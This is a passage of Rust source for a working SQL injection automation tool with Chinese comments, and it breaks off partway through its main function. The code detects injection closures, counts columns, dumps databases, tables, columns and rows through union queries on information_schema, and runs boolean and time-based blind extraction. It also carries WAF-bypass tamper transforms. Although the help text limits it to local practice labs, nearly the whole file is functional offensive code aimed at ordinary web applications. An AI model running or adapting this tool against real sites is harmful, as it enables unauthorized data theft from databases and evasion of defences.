//! sqli - SQL 注入自动化工具 (合并版)
//! 五步方法论: 确认注入 -> 探测列数 -> 爆库 -> 爆表爆列 -> 提取数据
//! 支持 union 回显 / 布尔盲注 / 时间盲注 / tamper WAF绕过
//! 兼容旧 sqli 的盲注表达式提取模式

use clap::{Parser, ValueEnum};
use colored::Colorize;
use common::http::{HttpClient, HttpOpts, Response};
use common::{exit, finish, Mode, Out};
use serde::Serialize;
use std::io::Write;
use std::time::{Duration, Instant};

const START: &str = "SQLRES_START";
const END: &str = "SQLRES_END";

#[derive(Copy, Clone, PartialEq, Eq, Debug, ValueEnum)]
enum BlindMode {
    Bool,
    Time,
}

#[derive(Copy, Clone, PartialEq, Eq, Debug, ValueEnum)]
enum OldMode {
    Auto,
    Bool,
    Time,
}

#[derive(Parser, Debug)]
#[command(
    name = "sqli",
    version,
    about = "SQL 注入自动化: 五步方法论 + union/盲注 + tamper",
    long_about = "五步方法论: 确认注入 -> 探测列数 -> 爆库 -> 爆表爆列 -> 提取数据\n\
                  支持 union 回显 / 布尔盲注 / 时间盲注 / WAF绕过(tamper)\n\
                  仅用于本地靶场学习(sqli-labs/DVWA), 禁止未授权测试\n\n\
                  退出码: 0=成功/命中 1=无结果 2=用法错误 3=运行错误",
    after_help = "示例:\n  sqli -u \"http://target/?id=1\"\n  sqli -u \"http://target/?id=1\" --blind bool\n  sqli -u \"http://target/\" -d \"uname=admin&passwd=1\" --ua-point\n  sqli \"http://target/?id=1\" --tables --mode time\n  sqli -u \"http://target/?id=1\" --tamper space2comment,doublewrite"
)]
struct Args {
    /// 目标 URL (也可用 -u/--url; GET 注入需含参数)
    #[arg(value_name = "URL")]
    url_pos: Option<String>,

    /// 目标 URL
    #[arg(short = 'u', long = "url", value_name = "URL")]
    url: Option<String>,

    /// 注入参数名 (默认自动: URL第一个GET参数 / POST第一个键 / Cookie第一个键)
    #[arg(short = 'p', long)]
    param: Option<String>,

    /// POST 数据体, 如 "uname=admin&passwd=1"; 提供后走 POST
    #[arg(short = 'd', long)]
    data: Option<String>,

    /// Cookie 字符串, 如 "uname=admin; other=x"
    #[arg(long)]
    cookie: Option<String>,

    /// 以 Cookie 作为注入载体
    #[arg(long)]
    cookie_point: bool,

    /// 以 User-Agent 头作为注入载体
    #[arg(long)]
    ua_point: bool,

    /// 以 Referer 头作为注入载体
    #[arg(long)]
    referer_point: bool,

    /// 强制盲注模式: bool=页面差异猜解 time=sleep延迟猜解
    #[arg(long, value_enum)]
    blind: Option<BlindMode>,

    /// 时间盲注 sleep 秒数
    #[arg(long, default_value_t = 3.0)]
    sleep: f64,

    /// 放宽容差判断 (页面有动态噪声时)
    #[arg(long)]
    fuzzy: bool,

    /// WAF绕过脚本, 逗号组合: space2comment,space2plus,space2tab,space2newline,doublewrite,casemix,inlinecomment,hexencode
    #[arg(long)]
    tamper: Option<String>,

    /// 跳过探测, 直接指定数据库
    #[arg(long)]
    db: Option<String>,

    /// 只提取指定表
    #[arg(long)]
    table: Option<String>,

    /// 与 --table 配合: 要导出的列, 逗号分隔; 无 --table 时为旧版语义(提取该表列名)
    #[arg(long)]
    columns: Option<String>,

    /// 导出行数上限
    #[arg(long, default_value_t = 50)]
    limit: usize,

    /// 请求超时秒数
    #[arg(long, default_value_t = 15)]
    timeout: u64,

    /// 每次请求间隔秒数
    #[arg(long, default_value_t = 0.0)]
    delay: f64,

    /// 代理, 如 http://127.0.0.1:8080
    #[arg(long)]
    proxy: Option<String>,

    /// 自定义 payload: 发送并打印响应
    #[arg(long)]
    custom: Option<String>,

    /// 详细输出
    #[arg(long)]
    verbose: bool,

    /// 不校验证书
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long)]
    ua: Option<String>,

    /// JSON 输出
    #[arg(long)]
    json: bool,

    // ---- 旧版 sqli 兼容 ----
    /// 请求方法 (旧版兼容)
    #[arg(long, value_enum, default_value_t = MethodArg::Get)]
    method: MethodArg,

    /// 注入标记 (旧版兼容, 默认 {INJ})
    #[arg(long, default_value = "{INJ}")]
    marker: String,

    /// 注入前缀, 可多次 (旧版兼容, 默认自动尝试 ' / " / 无)
    #[arg(long, action = clap::ArgAction::Append)]
    prefix: Vec<String>,

    /// 注入后缀, 可多次 (旧版兼容, 默认 -- - / # / 空)
    #[arg(long, action = clap::ArgAction::Append)]
    suffix: Vec<String>,

    /// 旧版模式: auto/bool/time
    #[arg(long, value_enum)]
    mode: Option<OldMode>,

    /// 布尔盲注: 为真时响应中的关键字
    #[arg(long)]
    true_word: Option<String>,

    /// 提取最大长度
    #[arg(long, default_value_t = 256)]
    maxlen: usize,

    /// 要提取的 SQL 表达式 (旧版兼容)
    #[arg(long)]
    query: Option<String>,

    /// 提取当前库表名 (旧版兼容)
    #[arg(long)]
    tables: bool,

    /// 导出表数据 (旧版兼容): --dump TABLE COLS
    #[arg(long, num_args = 2, value_names = ["TABLE", "COLS"])]
    dump: Option<Vec<String>>,
}

#[derive(Copy, Clone, PartialEq, Eq, Debug, ValueEnum)]
enum MethodArg {
    Get,
    Post,
}

#[derive(Serialize, Default)]
struct Report {
    url: String,
    carrier: String,
    param: String,
    injectable: bool,
    technique: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    closure: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    columns: Option<usize>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    echo: Vec<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    database: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    tables: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    table_columns: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    rows: Vec<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    flags: Vec<String>,
}

// ==================== tamper ====================

fn tamper_apply(payload: &str, names: &[String]) -> String {
    let mut s = payload.to_string();
    for n in names {
        s = match n.as_str() {
            "space2comment" => s.replace(' ', "/**/"),
            "space2plus" => s.replace(' ', "+"),
            "space2tab" => s.replace(' ', "%09"),
            "space2newline" => s.replace(' ', "%0a"),
            "doublewrite" => {
                let mut t = s.clone();
                for kw in [
                    "union",
                    "select",
                    "from",
                    "where",
                    "insert",
                    "and",
                    "or",
                    "order",
                    "group",
                    "information_schema",
                ] {
                    let i = kw.len() / 2;
                    let rep = format!("{}{}{}", &kw[..i], kw, &kw[i..]);
                    t = t.replace(kw, &rep);
                }
                t
            }
            "casemix" => {
                let seed = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.subsec_nanos() as u64)
                    .unwrap_or(12345);
                let mut r = seed | 1;
                s.chars()
                    .map(|c| {
                        r = r.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
                        if r >> 33 & 1 == 1 {
                            c.to_ascii_uppercase()
                        } else {
                            c.to_ascii_lowercase()
                        }
                    })
                    .collect()
            }
            "inlinecomment" => {
                let mut t = s.clone();
                for kw in ["union", "select", "from", "where"] {
                    let i = kw.len() / 2;
                    let rep = format!("{}/**/{}", &kw[..i], &kw[i..]);
                    t = t.replace(kw, &rep);
                }
                t
            }
            "hexencode" => {
                let re = regex::Regex::new(r"'([^']*)'").expect("hexencode regex");
                re.replace_all(&s, |caps: &regex::Captures| {
                    format!("0x{}", hex_encode(caps[1].as_bytes()))
                })
                .to_string()
            }
            other => {
                eprintln!("[!] 未知 tamper: {other}");
                s
            }
        };
    }
    s
}

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

// ==================== URL 编码 (Python quote_plus 等价) ====================

fn quote_plus(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'_' | b'.' | b'-' | b'~' => {
                out.push(b as char)
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn parse_query(url: &str) -> (String, Vec<(String, String)>, String) {
    let (base, query, frag) = match url.split_once('?') {
        Some((b, rest)) => match rest.split_once('#') {
            Some((q, f)) => (b.to_string(), q.to_string(), f.to_string()),
            None => (b.to_string(), rest.to_string(), String::new()),
        },
        None => match url.split_once('#') {
            Some((b, f)) => (b.to_string(), String::new(), f.to_string()),
            None => (url.to_string(), String::new(), String::new()),
        },
    };
    let mut params = Vec::new();
    for pair in query.split('&') {
        if pair.is_empty() {
            continue;
        }
        let (k, v) = match pair.split_once('=') {
            Some((k, v)) => (k.to_string(), v.to_string()),
            None => (pair.to_string(), String::new()),
        };
        params.push((k, v));
    }
    (base, params, frag)
}

fn set_query_param(url: &str, key: &str, value: &str) -> String {
    let (base, mut params, frag) = parse_query(url);
    params.retain(|(k, _)| k != key);
    params.push((key.to_string(), value.to_string()));
    let q: Vec<String> = params
        .iter()
        .map(|(k, v)| format!("{}={}", quote_plus(k), quote_plus(v)))
        .collect();
    let mut out = format!("{}?{}", base, q.join("&"));
    if !frag.is_empty() {
        out.push('#');
        out.push_str(&frag);
    }
    out
}

fn parse_form(raw: &str) -> Vec<(String, String)> {
    raw.split('&')
        .filter(|p| !p.is_empty())
        .map(|p| match p.split_once('=') {
            Some((k, v)) => (k.to_string(), v.to_string()),
            None => (p.to_string(), String::new()),
        })
        .collect()
}

fn form_encode(data: &[(String, String)]) -> String {
    data.iter()
        .map(|(k, v)| format!("{}={}", quote_plus(k), quote_plus(v)))
        .collect::<Vec<_>>()
        .join("&")
}

// ==================== 注入点 ====================

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Carrier {
    Get,
    Post,
    Cookie,
    Ua,
    Referer,
}

impl Carrier {
    fn name(&self) -> &'static str {
        match self {
            Carrier::Get => "get",
            Carrier::Post => "post",
            Carrier::Cookie => "cookie",
            Carrier::Ua => "ua",
            Carrier::Referer => "referer",
        }
    }
}

struct Point {
    url: String,
    method: String,
    param: String,
    carrier: Carrier,
    data: Vec<(String, String)>,
    cookie_extra: String,
    cookie: Option<String>,
    tamper: Vec<String>,
}

struct Sender {
    client: HttpClient,
    delay: f64,
}

impl Sender {
    fn send(&self, point: &Point, payload: &str) -> (String, f64) {
        let payload = if point.tamper.is_empty() {
            payload.to_string()
        } else {
            tamper_apply(payload, &point.tamper)
        };
        let t0 = Instant::now();
        let result: Result<Response, String> = match point.carrier {
            Carrier::Get => {
                let u = set_query_param(&point.url, &point.param, &payload);
                let mut h = Vec::new();
                if let Some(c) = &point.cookie {
                    h.push(("Cookie".to_string(), c.clone()));
                }
                self.client.request("GET", &u, &h, None)
            }
            Carrier::Post => {
                let mut d = point.data.clone();
                if let Some(slot) = d.iter_mut().find(|(k, _)| *k == point.param) {
                    slot.1 = payload.clone();
                } else {
                    d.push((point.param.clone(), payload.clone()));
                }
                let body = form_encode(&d);
                let mut h = Vec::new();
                if let Some(c) = &point.cookie {
                    h.push(("Cookie".to_string(), c.clone()));
                }
                self.client.request(
                    "POST",
                    &point.url,
                    &h,
                    Some((body.as_bytes(), "application/x-www-form-urlencoded")),
                )
            }
            Carrier::Cookie => {
                let mut ck = format!("{}={}", point.param, payload);
                if !point.cookie_extra.is_empty() {
                    ck.push_str("; ");
                    ck.push_str(&point.cookie_extra);
                }
                let h = vec![("Cookie".to_string(), ck)];
                let m = if point.method == "POST" { "POST" } else { "GET" };
                let body = if m == "POST" && !point.data.is_empty() {
                    Some((
                        form_encode(&point.data).into_bytes(),
                        "application/x-www-form-urlencoded",
                    ))
                } else {
                    None
                };
                match body {
                    Some((b, ct)) => self.client.request(m, &point.url, &h, Some((&b, ct))),
                    None => self.client.request(m, &point.url, &h, None),
                }
            }
            Carrier::Ua => {
                let mut h = vec![("User-Agent".to_string(), payload.clone())];
                if let Some(c) = &point.cookie {
                    h.push(("Cookie".to_string(), c.clone()));
                }
                let m = if point.method == "POST" { "POST" } else { "GET" };
                let body = if m == "POST" && !point.data.is_empty() {
                    Some((
                        form_encode(&point.data).into_bytes(),
                        "application/x-www-form-urlencoded",
                    ))
                } else {
                    None
                };
                match body {
                    Some((b, ct)) => self.client.request(m, &point.url, &h, Some((&b, ct))),
                    None => self.client.request(m, &point.url, &h, None),
                }
            }
            Carrier::Referer => {
                let mut h = vec![("Referer".to_string(), payload.clone())];
                if let Some(c) = &point.cookie {
                    h.push(("Cookie".to_string(), c.clone()));
                }
                let m = if point.method == "POST" { "POST" } else { "GET" };
                let body = if m == "POST" && !point.data.is_empty() {
                    Some((
                        form_encode(&point.data).into_bytes(),
                        "application/x-www-form-urlencoded",
                    ))
                } else {
                    None
                };
                match body {
                    Some((b, ct)) => self.client.request(m, &point.url, &h, Some((&b, ct))),
                    None => self.client.request(m, &point.url, &h, None),
                }
            }
        };
        let elapsed = t0.elapsed().as_secs_f64();
        if self.delay > 0.0 {
            std::thread::sleep(Duration::from_secs_f64(self.delay));
        }
        let text = match result {
            Ok(r) => String::from_utf8_lossy(&r.body).to_string(),
            Err(e) => format!("__HTTP_ERROR__: {e}"),
        };
        (text, elapsed)
    }
}

// ==================== 闭合方式 ====================

struct Closure {
    name: &'static str,
    tpl_bool_true: &'static str,
    tpl_bool_false: &'static str,
    tpl_union: &'static str,
    tpl_orderby: &'static str,
    tpl_blind: &'static str,
}

impl Closure {
    fn bool_payload(&self, base: &str, which: bool) -> String {
        let t = if which { self.tpl_bool_true } else { self.tpl_bool_false };
        t.replace("{b}", base)
    }
    fn union(&self, base: &str, body: &str) -> String {
        self.tpl_union.replace("{b}", base).replace("{cols}", body)
    }
    fn orderby(&self, base: &str, n: usize) -> String {
        self.tpl_orderby.replace("{b}", base).replace("{n}", &n.to_string())
    }
    fn blind(&self, base: &str, expr: &str) -> String {
        self.tpl_blind.replace("{b}", base).replace("{expr}", expr)
    }
}

fn closures() -> Vec<Closure> {
    vec![
        Closure {
            name: "整数型",
            tpl_bool_true: "{b} and 1=1",
            tpl_bool_false: "{b} and 1=2",
            tpl_union: "{b} union select {cols}",
            tpl_orderby: "{b} order by {n}",
            tpl_blind: "{b} and ({expr})",
        },
        Closure {
            name: "单引号 '",
            tpl_bool_true: "{b}' and '1'='1",
            tpl_bool_false: "{b}' and '1'='2",
            tpl_union: "{b}' union select {cols} -- +",
            tpl_orderby: "{b}' order by {n} -- +",
            tpl_blind: "{b}' and ({expr}) -- +",
        },
        Closure {
            name: "双引号 \"",
            tpl_bool_true: "{b}\" and \"1\"=\"1",
            tpl_bool_false: "{b}\" and \"1\"=\"2",
            tpl_union: "{b}\" union select {cols} -- +",
            tpl_orderby: "{b}\" order by {n} -- +",
            tpl_blind: "{b}\" and ({expr}) -- +",
        },
        Closure {
            name: "单引号括号 ')",
            tpl_bool_true: "{b}') and ('1')=('1",
            tpl_bool_false: "{b}') and ('1')=('2",
            tpl_union: "{b}') union select {cols} -- +",
            tpl_orderby: "{b}') order by {n} -- +",
            tpl_blind: "{b}') and ({expr}) -- +",
        },
        Closure {
            name: "双引号括号 \")",
            tpl_bool_true: "{b}\") and (\"1\")=(\"1",
            tpl_bool_false: "{b}\") and (\"1\")=(\"2",
            tpl_union: "{b}\") union select {cols} -- +",
            tpl_orderby: "{b}\") order by {n} -- +",
            tpl_blind: "{b}\") and ({expr}) -- +",
        },
    ]
}

fn same_len(a: &str, b: &str, tol: f64) -> bool {
    if a.is_empty() || b.is_empty() {
        return false;
    }
    let (la, lb) = (a.len(), b.len());
    let diff = la.abs_diff(lb);
    diff <= std::cmp::max(4, (std::cmp::max(la, lb) as f64 * tol) as usize)
}

fn errorish(text: &str) -> bool {
    let low = text.to_lowercase();
    ["unknown column", "order clause", "sql syntax", "__http_error__"]
        .iter()
        .any(|m| low.contains(m))
}

// ==================== 探测 ====================

fn detect_closure(
    sender: &Sender,
    point: &Point,
    base: &str,
    out: &Out,
) -> Option<Closure> {
    let (base_text, _) = sender.send(point, base);
    for cl in closures() {
        let (rt, _) = sender.send(point, &cl.bool_payload(base, true));
        let (rf, _) = sender.send(point, &cl.bool_payload(base, false));
        let diff = !same_len(&rt, &rf, 0.05) && !rt.is_empty();
        if out.json() {
            eprintln!(
                "    尝试 {:<12} 真:{:>6}B 假:{:>6}B {}",
                cl.name,
                rt.len(),
                rf.len(),
                if diff { "<-- 差异" } else { "" }
            );
        } else {
            println!(
                "    尝试 {:<12} 真:{:>6}B 假:{:>6}B {}",
                cl.name,
                rt.len(),
                rf.len(),
                if diff { "<-- 差异".green().to_string() } else { String::new() }
            );
        }
        if diff {
            out.info(&format!("{} 命中闭合方式: {}", "[+]".green(), cl.name));
            return Some(cl);
        }
    }
    let _ = base_text;
    out.error("未发现真/假差异: 可能无差异回显, 尝试 --blind time; 或页面动态噪声大, 用 --fuzzy 放宽容差");
    None
}

fn find_columns(sender: &Sender, point: &Point, cl: &Closure, base: &str, out: &Out) -> Option<usize> {
    let mut cols = None;
    let mut n = 1;
    while n <= 40 {
        let (text, _) = sender.send(point, &cl.orderby(base, n));
        if errorish(&text) {
            break;
        }
        cols = Some(n);
        if out.json() {
            eprintln!("    order by {n:<3} 正常");
        } else {
            println!("    order by {n:<3} 正常");
        }
        n += 1;
    }
    match cols {
        Some(c) => out.info(&format!("{} 列数: {}", "[+]".green(), c)),
        None => out.info(&format!("{} order by 探测失败(被过滤或无报错差异), 跳过", "[!]".yellow())),
    }
    cols
}

fn find_echo(
    sender: &Sender,
    point: &Point,
    cl: &Closure,
    base: &str,
    cols: usize,
    out: &Out,
) -> Vec<usize> {
    let markers: Vec<String> = (1..=cols).map(|i| format!("S{i}QLMARK")).collect();
    let body = markers
        .iter()
        .map(|m| format!("'{m}'"))
        .collect::<Vec<_>>()
        .join(",");
    let payload = cl.union(base, &body);
    let (text, _) = sender.send(point, &payload);
    let found: Vec<usize> = markers
        .iter()
        .enumerate()
        .filter(|(_, m)| text.contains(m.as_str()))
        .map(|(i, _)| i + 1)
        .collect();
    if found.is_empty() {
        out.info(&format!("{} union 无回显: 考虑报错注入手法或 --blind bool/time", "[!]".yellow()));
    } else {
        out.info(&format!(
            "{} 回显位: 第 {} 列",
            "[+]".green(),
            found.iter().map(|i| i.to_string()).collect::<Vec<_>>().join(", ")
        ));
    }
    found
}

// ==================== union 提取 ====================

struct Extractor<'a> {
    sender: &'a Sender,
    point: &'a Point,
    cl: &'a Closure,
    base: &'a str,
    echo: &'a [usize],
    cols: usize,
}

impl<'a> Extractor<'a> {
    fn ask(&self, subquery: &str) -> Option<String> {
        let mut slots = Vec::new();
        let mut placed = false;
        for i in 1..=self.cols {
            if self.echo.contains(&i) && !placed {
                slots.push(format!(
                    "concat(0x{},({subquery}),0x{})",
                    hex_encode(START.as_bytes()),
                    hex_encode(END.as_bytes())
                ));
                placed = true;
            } else {
                slots.push(i.to_string());
            }
        }
        let payload = self.cl.union(self.base, &slots.join(","));
        let (text, _) = self.sender.send(self.point, &payload);
        if !text.contains(START) || !text.contains(END) {
            return None;
        }
        let body = text.split(START).nth(1)?.split(END).next()?.trim().to_string();
        Some(body)
    }

    fn current_db(&self, out: &Out) -> Option<String> {
        match self.ask("database()") {
            Some(v) => {
                out.info(&format!("{} 当前数据库: {}", "[+]".green(), v));
                Some(v)
            }
            None => {
                out.info(&format!("{} 获取 database() 失败", "[!]".yellow()));
                None
            }
        }
    }

    fn tables(&self, db: &str, out: &Out) -> Option<String> {
        let v = self.ask(&format!(
            "group_concat(table_name) from information_schema.tables where table_schema=0x{}",
            hex_encode(db.as_bytes())
        ));
        if let Some(ref v) = v {
            out.info(&format!("{} [{}] 表: {}", "[+]".green(), db, v));
        }
        v
    }

    fn columns(&self, table: &str, db: Option<&str>, out: &Out) -> Option<String> {
        let mut where_ = format!("table_name=0x{}", hex_encode(table.as_bytes()));
        if let Some(db) = db {
            where_.push_str(&format!(
                " and table_schema=0x{}",
                hex_encode(db.as_bytes())
            ));
        }
        let v = self.ask(&format!(
            "group_concat(column_name) from information_schema.columns where {where_}"
        ));
        if let Some(ref v) = v {
            out.info(&format!("{} [{}] 列: {}", "[+]".green(), table, v));
        }
        v
    }

    fn dump(&self, table: &str, columns: &str, db: Option<&str>, limit: usize) -> Option<String> {
        let src = match db {
            Some(db) if !table.contains('.') => format!("{db}.{table}"),
            _ => table.to_string(),
        };
        let cols: Vec<&str> = columns.split(',').map(|c| c.trim()).filter(|c| !c.is_empty()).collect();
        if cols.is_empty() {
            return None;
        }
        let sub = if cols.len() > 1 {
            format!(
                "group_concat(concat({}) separator 0x0a) from {src} limit {limit}",
                cols.join(",0x3a,")
            )
        } else {
            format!(
                "group_concat({} separator 0x0a) from {src} limit {limit}",
                cols[0]
            )
        };
        self.ask(&sub)
    }
}

// ==================== 盲注 ====================

struct Blind<'a> {
    sender: &'a Sender,
    point: &'a Point,
    cl: &'a Closure,
    base: &'a str,
    mode: BlindMode,
    sleep_time: f64,
    tol: f64,
    ref_false: String,
}

impl<'a> Blind<'a> {
    fn new(
        sender: &'a Sender,
        point: &'a Point,
        cl: &'a Closure,
        base: &'a str,
        mode: BlindMode,
        sleep_time: f64,
        fuzzy: bool,
        out: &Out,
    ) -> Result<Self, String> {
        let tol = if fuzzy { 0.15 } else { 0.05 };
        let mut ref_false = String::new();
        if mode == BlindMode::Bool {
            let (rt, _) = sender.send(point, &cl.bool_payload(base, true));
            let (rf, _) = sender.send(point, &cl.bool_payload(base, false));
            if rt.is_empty() {
                return Err("恒真页面无响应, 检查注入点或改用 --blind time".to_string());
            }
            if same_len(&rt, &rf, tol) {
                out.info(&format!("{} 恒真/恒假页面过于相似, 布尔判断可能不可靠", "[!]".yellow()));
            }
            ref_false = rf;
        }
        Ok(Blind {
            sender,
            point,
            cl,
            base,
            mode,
            sleep_time,
            tol,
            ref_false,
        })
    }

    fn close(&self, a: &str) -> bool {
        let b = &self.ref_false;
        if a == b {
            return true;
        }
        let (la, lb) = (a.len(), b.len());
        la.abs_diff(lb) <= std::cmp::max(4, (std::cmp::max(std::cmp::max(la, lb), 4) as f64 * self.tol) as usize)
    }

    fn ask(&self, expr: &str) -> bool {
        let wrapped = if self.mode == BlindMode::Time {
            format!("if({expr},sleep({}),0)", self.sleep_time)
        } else {
            expr.to_string()
        };
        let payload = self.cl.blind(self.base, &wrapped);
        let (text, elapsed) = self.sender.send(self.point, &payload);
        if text.contains("__HTTP_ERROR__") {
            return false;
        }
        if self.mode == BlindMode::Time {
            return elapsed >= self.sleep_time * 0.8;
        }
        !self.close(&text)
    }

    fn guess_char(&self, expr: &str, pos: usize) -> Option<char> {
        if !self.ask(&format!("ascii(substr(({expr}),{pos},1))>0")) {
            return None;
        }
        let (mut lo, mut hi) = (32i32, 127i32);
        while lo < hi {
            let mid = (lo + hi) / 2;
            if self.ask(&format!("ascii(substr(({expr}),{pos},1))>{mid}")) {
                lo = mid + 1;
            } else {
                hi = mid;
            }
        }
        char::from_u32(lo as u32)
    }

    fn ask_str(&self, expr: &str, max_len: usize, out: &Out) -> String {
        let mut result = String::new();
        for pos in 1..=max_len {
            match self.guess_char(expr, pos) {
                Some(c) => {
                    result.push(c);
                    if out.json() {
                        eprint!("\r    {:.40} = {}   ", expr, result);
                        let _ = std::io::stderr().flush();
                    } else {
                        print!("\r    {:.40} = {}   ", expr, result);
                        let _ = std::io::stdout().flush();
                    }
                }
                None => break,
            }
        }
        if out.json() {
            eprintln!();
        } else {
            println!();
        }
        if !result.is_empty() {
            out.info(&format!("{} 猜解完成: {}", "[+]".green(), result));
        } else {
            out.info(&format!("{} 盲注未得到结果", "[!]".yellow()));
        }
        result
    }
}

// ==================== 旧版盲注流程 (marker模型) ====================

struct OldPoint {
    url: String,
    method: String,
    data: Vec<(String, String)>,
    cookie: Option<String>,
    marker: String,
}

impl OldPoint {
    fn send(&self, sender: &Sender, payload: &str) -> (u16, String, f64) {
        let t0 = Instant::now();
        let result = if !self.data.is_empty() {
            let d: Vec<(String, String)> = self
                .data
                .iter()
                .map(|(k, v)| {
                    (
                        k.clone(),
                        if v.contains(&self.marker) {
                            v.replace(&self.marker, payload)
                        } else {
                            v.clone()
                        },
                    )
                })
                .collect();
            let body = form_encode(&d);
            let mut h = Vec::new();
            if let Some(c) = &self.cookie {
                h.push(("Cookie".to_string(), c.clone()));
            }
            sender.client.request(
                if self.method == "POST" { "POST" } else { "GET" },
                &self.url,
                &h,
                Some((body.as_bytes(), "application/x-www-form-urlencoded")),
            )
        } else {
            let target = if self.url.contains(&self.marker) {
                self.url.replace(&self.marker, &quote_plus(payload))
            } else {
                let sep = if self.url.contains('?') { "&" } else { "?" };
                format!("{}{}{}", self.url, sep, quote_plus(payload))
            };
            let mut h = Vec::new();
            if let Some(c) = &self.cookie {
                h.push(("Cookie".to_string(), c.clone()));
            }
            sender.client.request("GET", &target, &h, None)
        };
        let elapsed = t0.elapsed().as_secs_f64();
        if sender.delay > 0.0 {
            std::thread::sleep(Duration::from_secs_f64(sender.delay));
        }
        match result {
            Ok(r) => (r.status, String::from_utf8_lossy(&r.body).to_string(), elapsed),
            Err(e) => (0, format!("__HTTP_ERROR__: {e}"), elapsed),
        }
    }
}

struct OldDetector<'a> {
    point: &'a OldPoint,
    sender: &'a Sender,
    prefixes: Vec<String>,
    suffixes: Vec<String>,
    sleep: f64,
    mode: OldMode,
    true_word: Option<String>,
}

impl<'a> OldDetector<'a> {
    fn injectable(&self, prefix: &str, suffix: &str) -> Option<&'static str> {
        if self.mode == OldMode::Auto || self.mode == OldMode::Bool {
            let true_p = format!("{prefix}AND 1=1{suffix}");
            let false_p = format!("{prefix}AND 1=2{suffix}");
            let (_, b1, _) = self.point.send(self.sender, &true_p);
            let (_, b2, _) = self.point.send(self.sender, &false_p);
            if let Some(kw) = &self.true_word {
                let k = kw.to_lowercase();
                if b1.to_lowercase().contains(&k) && !b2.to_lowercase().contains(&k) {
                    return Some("bool");
                }
            } else if b1 != b2 {
                return Some("bool");
            }
        }
        if self.mode == OldMode::Auto || self.mode == OldMode::Time {
            let t1p = format!("{prefix}AND SLEEP({}){suffix}", self.sleep);
            let t2p = format!("{prefix}AND SLEEP(0){suffix}");
            let (_, _, t1) = self.point.send(self.sender, &t1p);
            let (_, _, t2) = self.point.send(self.sender, &t2p);
            if t1 - t2 >= self.sleep * 0.8 {
                return Some("time");
            }
        }
        None
    }

    fn detect(&self, out: &Out) -> Option<(&'static str, String, String)> {
        for p in &self.prefixes {
            for s in &self.suffixes {
                if let Some(kind) = self.injectable(p, s) {
                    out.info(&format!(
                        "{} 注入点: {} 盲注  prefix={p:?} suffix={s:?}",
                        "[+]".green(),
                        kind
                    ));
                    return Some((kind, p.clone(), s.clone()));
                }
            }
        }
        None
    }
}

struct OldExtractor<'a> {
    point: &'a OldPoint,
    sender: &'a Sender,
    kind: &'static str,
    prefix: String,
    suffix: String,
    sleep: f64,
    true_word: Option<String>,
    maxlen: usize,
}

impl<'a> OldExtractor<'a> {
    fn probe(&self, expr: &str) -> (u16, String, f64) {
        self.point.send(self.sender, expr)
    }

    fn truthy(&self, cond: &str) -> bool {
        if self.kind == "bool" {
            let expr = format!("{}AND {}{}", self.prefix, cond, self.suffix);
            let (_, b, _) = self.probe(&expr);
            if let Some(kw) = &self.true_word {
                return b.to_lowercase().contains(&kw.to_lowercase());
            }
            let t = format!("{}AND 1=1{}", self.prefix, self.suffix);
            let (_, b2, _) = self.probe(&t);
            b == b2
        } else {
            let t = format!(
                "{}AND IF({},SLEEP({}),0){}",
                self.prefix, cond, self.sleep, self.suffix
            );
            let f = format!(
                "{}AND IF(NOT({}),SLEEP({}),0){}",
                self.prefix, cond, self.sleep, self.suffix
            );
            let (_, _, t1) = self.probe(&t);
            let (_, _, t2) = self.probe(&f);
            t1 > t2
        }
    }

    fn extract(&self, expr: &str, out: &Out) -> String {
        let mut result = String::new();
        for pos in 1..=self.maxlen {
            let (mut lo, mut hi) = (0i32, 255i32);
            while lo < hi {
                let mid = (lo + hi) / 2;
                let cond = format!("ASCII(SUBSTR(({expr}),{pos},1))>{mid}");
                if self.truthy(&cond) {
                    lo = mid + 1;
                } else {
                    hi = mid;
                }
            }
            if lo == 0 {
                break;
            }
            let c = char::from_u32(lo as u32).unwrap_or('?');
            result.push(c);
            if out.json() {
                eprint!("{c}");
                let _ = std::io::stderr().flush();
            } else {
                print!("{c}");
                let _ = std::io::stdout().flush();
            }
        }
        if out.json() {
            eprintln!();
        } else {
            println!();
        }
        result
    }
}

// ==================== main ====================

fn main() -> std::process::ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let url = match args.url.clone().or_else(|| args.url_pos.clone()) {
        Some(u) => u,
        None => {
            out.error("缺少目标 URL (位置参数或 -u/--url)");
            return finish(exit::USAGE);
        }
    };

    let tamper_names: Vec<String> = args
        .tamper
        .as_deref()
        .map(|s| s.split(',').map(|x| x.trim().to_string()).filter(|x| !x.is_empty()).collect())
        .unwrap_or_default();

    let http_opts = HttpOpts {
        timeout: args.timeout,
        proxy: args.proxy.clone(),
        insecure: args.insecure,
        user_agent: args
            .ua
            .clone()
            .unwrap_or_else(|| "Mozilla/5.0 (X11; Linux x86_64) sqlinject/1.0".to_string()),
        cookie: None,
        redirects: 10,
    };
    let client = match HttpClient::new(&http_opts) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return finish(exit::ERROR);
        }
    };
    let sender = Sender {
        client,
        delay: args.delay,
    };

    let old_style = args.query.is_some()
        || args.tables
        || args.dump.is_some()
        || (args.columns.is_some() && args.table.is_none())
        || args.mode.is_some()
        || args.prefix.len() > 0
        || args.suffix.len() > 0
        || args.true_word.is_some();

    // ---------- 旧版盲注流程 ----------
    if old_style {
        let data = match &args.data {
            Some(d) => parse_form(d),
            None => Vec::new(),
        };
        let old_point = OldPoint {
            url: url.clone(),
